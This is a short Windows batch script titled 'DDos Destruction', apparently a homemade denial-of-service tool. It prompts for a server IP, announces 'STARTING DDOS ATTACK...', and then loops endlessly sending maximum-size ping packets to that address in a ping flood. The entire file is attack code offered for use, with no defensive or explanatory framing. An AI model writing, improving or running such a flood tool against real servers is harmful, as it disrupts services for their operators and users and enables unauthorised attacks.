@echo off
color 0a
mode 100,28
title DDos Destruction - y0nakk

:menu
cls
call l.cmd
echo ----------------------------------------------------------------------------------------------
echo.
set /p input=Server IP: 
goto attack

:attack
cls
call l.cmd
echo ----------------------------------------------------------------------------------------------
echo.
timeout /t 1 /nobreak >nul
echo STARTING DDOS ATTACK...
timeout /t 2 /nobreak >nul
goto loop

:loop
ping %input% -l 65500 -t -w 1 -n 1
goto loop
